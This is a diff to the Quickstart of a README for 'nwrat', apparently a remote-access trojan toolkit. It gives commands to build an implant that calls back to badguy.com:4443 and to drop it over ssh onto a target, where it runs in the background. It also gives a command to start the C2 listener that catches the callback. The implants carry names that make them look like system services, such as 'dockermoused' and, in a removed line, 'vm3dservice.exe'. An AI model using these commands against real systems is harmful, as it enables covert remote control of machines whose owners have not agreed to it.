@@ -34,12 +34,10 @@ Quickstart
 go get github.com/magisterquis/nwrat
 # Build the C2 server for the local platform
 go build github.com/magisterquis/nwrat
-# Build an implant for a Linux platform, setting the callback address
+# Build an implant for a different platform, setting the callback address
 GOOS=linux go build -o dockermoused -ldflags="-X main.callbackAddr=badguy.com:4443" github.com/magisterquis/nwrat
-# Put the implant on a Linux target it and run it
+# Put the implant on target it and run it
 ssh target 'cat >/tmp/dockermoused && chmod 0700 /tmp/dockermoused && /tmp/dockermoused &' <./dockermoused
-# Build an implant for a Windows platform, setting the callback address
-GOOS=windows go build -o vm3dservice.exe -ldflags="-X main.callbackAddr=badguy.com:4443" github.com/magisterquis/nwrat
 # Catch a callback
 ./nwrat -listen localhost:4443 -cert ./badguy.com.crt -key ./badguy.com.key
 ```
